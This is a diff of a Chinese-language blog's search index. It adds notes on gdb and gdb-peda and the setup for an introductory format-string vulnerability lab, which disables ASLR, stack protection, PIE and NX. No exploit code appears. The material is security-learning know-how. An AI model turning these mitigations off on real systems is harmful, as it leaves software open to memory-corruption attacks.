+</ol>
+<h1 id="0x04-ubuntu16-04下的vsftpd安装"><a href="#0x04-ubuntu16-04下的vsftpd安装" class="headerlink" title="0x04 ubuntu16.04下的vsftpd安装"></a>0x04 ubuntu16.04下的vsftpd安装</h1><p>见单独的页面</p>
 <h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><p>[1] <a href="https://blog.csdn.net/u014775723/article/details/85213793" target="_blank" rel="noopener">https://blog.csdn.net/u014775723/article/details/85213793</a></p>
 ]]></content>
       <categories>
-        <category>tool</category>
+        <category>linux</category>
       </categories>
       <tags>
         <tag>语言环境安装配置</tag>
@@ -584,6 +1549,38 @@
 ]]></content>
       <categories>
         <category>tool</category>
+      </categories>
+      <tags>
+        <tag>linux</tag>
+        <tag>字符串格式化漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>printFormat</title>
+    <url>/2019/10/22/printFormat/</url>
+    <content><![CDATA[<h1 id="字符串格式漏洞入门案例"><a href="#字符串格式漏洞入门案例" class="headerlink" title="字符串格式漏洞入门案例"></a>字符串格式漏洞入门案例</h1><p>介绍一个格式化字符串漏洞</p>
+<a id="more"></a>
+<h2 id="1-运行环境"><a href="#1-运行环境" class="headerlink" title="1. 运行环境"></a>1. 运行环境</h2><p>ubuntu16.04<br><br>gcc5.4.0<br><br>gcc-peda</p>
+<h2 id="2-准备工作"><a href="#2-准备工作" class="headerlink" title="2. 准备工作"></a>2. 准备工作</h2><ul>
+<li>关闭ASLR(地址空间布局随机化)<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo 0 &gt; /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<blockquote>
+<p>地址空间布局随机化：<br>每次加载程序到内存中时，进程地址空间的堆栈起始地址动态变化。用来阻止缓冲区溢出的攻击的<strong>linux内核参数</strong><br><br>0：关闭<br>2：打开</p>
+</blockquote>
+<ul>
+<li>禁用栈保护措施和关闭PIE保护<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gcc -m32 -fno-stack-protector -no-pie fmt.c</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<blockquote>
+<p>PIE:<br><br>PIE全称是position-independent executable，中文解释为地址无关可执行文件，该技术是一个针对代码段（.text）、数据段（.data）、未初始化全局变量段（.bss）等固定地址的一个防护技术，如果程序开启了PIE保护的话，在每次加载程序时都变换加载地址，从而不能通过ROPgadget等一些工具来帮助解题[1]</p>
+</blockquote>
+<h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><p>[1] <a href="https://www.anquanke.com/post/id/177520" target="_blank" rel="noopener">https://www.anquanke.com/post/id/177520</a></p>
+]]></content>
+      <categories>
+        <category>pwn</category>
       </categories>
       <tags>
         <tag>linux</tag>
@@ -619,8 +1616,21 @@
 <li><p>gcc生成调试信息</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gcc -g test.c -o test</span><br></pre></td></tr></table></figure>
 </li>
-<li><p>gcc编译生成32bit代码</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gcc -m32 hello.c -o hello</span><br></pre></td></tr></table></figure>
+<li><p>关闭一些安全手段<br>关闭栈保护和pie，可以加上<code>-g</code>生成一些调试信息</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ehcho 0 &gt; /proc/sys/kernel/randomize_va_space</span><br><span class="line">gcc -m32 -fno-stack-protector  -no-pie fmt.c</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>关闭NX</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gcc -Wall -g -Wl,-zexecstack</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<blockquote>
+<p>wall：生成所有的警告信息<br>合成一下，关闭一些安全选项</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gcc -Wall -g -m32 -fno-stack-protector  -no-pie -o fmtc fmt.c -Wl,-zexecstack</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>gcc编译生成32bit代码<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gcc -m32 hello.c -o hello</span><br></pre></td></tr></table></figure>
 
 </li>
 </ul>
@@ -679,6 +1689,8 @@
 <h4 id="单步"><a href="#单步" class="headerlink" title="单步"></a>单步</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(gdb) start</span><br></pre></td></tr></table></figure>
 
 <p>这个时候会进入程序运行状态，单步运行需要输入<code>n</code>，输入一次执行一条语句。<code>s</code>单步会进入子程序中去。</p>
+<h4 id="跳出函数fin"><a href="#跳出函数fin" class="headerlink" title="跳出函数fin"></a>跳出函数fin</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(gdb) finish</span><br><span class="line">#或者</span><br><span class="line">(gdb) fin</span><br></pre></td></tr></table></figure>
+
 <h4 id="断点-单步"><a href="#断点-单步" class="headerlink" title="断点+单步"></a>断点+单步</h4><p>启动的时候<code>start</code>程序会在第一行停止。<br>这个时候可以设置断点，如下所示：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(gdb) b 5</span><br><span class="line">(gdb) c #运行程序到断点处，一般在设置完断点后使用</span><br><span class="line">(gdb) r #重新运行程序 run</span><br></pre></td></tr></table></figure>
 
@@ -702,6 +1714,16 @@
 <h4 id="反汇编命令"><a href="#反汇编命令" class="headerlink" title="反汇编命令"></a>反汇编命令</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(gdb) disassemble main</span><br><span class="line">#可简写成</span><br><span class="line">(gdb) disas main</span><br></pre></td></tr></table></figure>
 
 <p>其中的main是一个函数名称。</p>
+<h4 id="查看内存"><a href="#查看内存" class="headerlink" title="查看内存"></a>查看内存</h4><p>格式<code>x/nfu &lt;addr&gt;</code>或者<code>x &lt;addr&gt;</code></p>
+<blockquote>
+<p>n—-指定显示多少单位的内存值，这个单位由<code>u</code>指定<br>f—–显示的格式，与<code>printf</code>格式相同，默认是<code>x</code>表示十六进制，可选的有<code>d</code>,<code>u</code>,<code>s</code>,<code>i</code>….<br>u——单位大小，b(字节)，h(双字节)，w(四字节)，g(八字节)<br>eg</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(gdb) x/10x $esp</span><br><span class="line">(gdb) x/100i $0xdddddd  以指令的形式查看内存区域</span><br></pre></td></tr></table></figure>
+
+<h4 id="修改寄存器的值"><a href="#修改寄存器的值" class="headerlink" title="修改寄存器的值"></a>修改寄存器的值</h4><p>使用<code>set</code></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(gdb) set $eax=0</span><br></pre></td></tr></table></figure>
+
+<p>可以使用<code>i r</code>查看你所有寄存器的值</p>
 <h3 id="3-2-gdb插件—gdb-peda"><a href="#3-2-gdb插件—gdb-peda" class="headerlink" title="3.2 gdb插件—gdb-peda"></a>3.2 gdb插件—gdb-peda</h3><p>PEDA(<strong>Python Exploit Development Assistance for GDB</strong>)是一个强大的 gdb 插件。它提供了高亮显示反汇编代码、寄存器、内存信息等人性化的功能。同时，PEDA 还有一些实用的新命令，比如checksec 可以查看程序开启了哪些安全机制等等。</p>
 <ul>
 <li>安装<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git clone https://github.com/longld/peda.git ~/peda</span><br><span class="line">$ echo &quot;source ~/peda/peda.py&quot; &gt;&gt; ~/.gdbinit</span><br></pre></td></tr></table></figure>
@@ -999,7 +2021,7 @@
 </blockquote>
 ]]></content>
       <categories>
-        <category>tool</category>
+        <category>linux</category>
       </categories>
       <tags>
         <tag>linux</tag>
@@ -1187,8 +2209,8 @@
         <category>Numpy</category>
       </categories>
       <tags>
-        <tag>Numpy</tag>
         <tag>Python</tag>
+        <tag>Numpy</tag>
       </tags>
   </entry>
   <entry>
@@ -1329,10 +2351,11 @@
 <h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><p>[1] <a href="https://blog.csdn.net/u014389734/article/details/79513517" target="_blank" rel="noopener">https://blog.csdn.net/u014389734/article/details/79513517</a><br>[2] <a href="http://dblab.xmu.edu.cn/blog/1998-2/" target="_blank" rel="noopener">http://dblab.xmu.edu.cn/blog/1998-2/</a><br>[3] <a href="https://www.cnblogs.com/chenmingjun/p/8506995.html" target="_blank" rel="noopener">https://www.cnblogs.com/chenmingjun/p/8506995.html</a> <span id="re3">Linux的桌面环境gnome、kde、xfce、lxde 等等使用比较</span></p>
 ]]></content>
       <categories>
-        <category>tool</category>
+        <category>linux</category>
       </categories>
       <tags>
-        <tag>Linux VNC</tag>
+        <tag>LinuxVNC</tag>
+        <tag>Ubuntu</tag>
       </tags>
   </entry>
   <entry>
@@ -1554,10 +2577,10 @@ print(predictions) #输出</code></pre><h2 id="附录"><a href="#附录" class="
 
 ]]></content>
       <categories>
-        <category>Linux Shell</category>
+        <category>linux</category>
       </categories>
       <tags>
-        <tag>shell</tag>
+        <tag>shellScript</tag>
       </tags>
   </entry>
 </search>
